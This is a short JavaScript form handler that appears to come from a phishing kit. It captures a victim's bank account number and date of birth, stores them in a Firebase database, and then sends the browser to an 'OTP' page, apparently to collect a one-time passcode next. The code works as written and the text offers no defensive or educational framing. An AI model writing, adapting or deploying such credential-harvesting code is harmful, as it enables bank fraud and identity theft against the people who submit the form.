// reference your database
var ududip005DB = firebase.database().ref("ududip005");

document.getElementById("ududip005").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var accnum = getElementVal("accnum");
    var udob = getElementVal("udob");
    



    saveMessages(accnum, udob,);

    // redirect to OTP page
    window.location.href = "otpb.html";
}

const saveMessages = (accnum, udob) => {
    var newududip005 = ududip005DB.push();

    newududip005.set({
        account_Number: accnum,
        Date_of_Birth: udob,
        



    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};